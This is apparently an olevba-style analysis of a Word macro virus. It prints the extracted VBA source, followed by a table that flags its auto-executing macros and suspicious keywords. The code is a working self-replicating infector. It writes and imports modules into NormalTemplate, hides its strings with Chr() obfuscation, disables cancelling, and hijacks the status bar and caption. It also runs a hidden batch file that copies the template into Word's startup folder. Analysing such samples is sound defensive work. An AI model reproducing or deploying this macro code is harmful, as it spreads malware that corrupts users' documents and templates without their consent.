"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For I = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next I
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

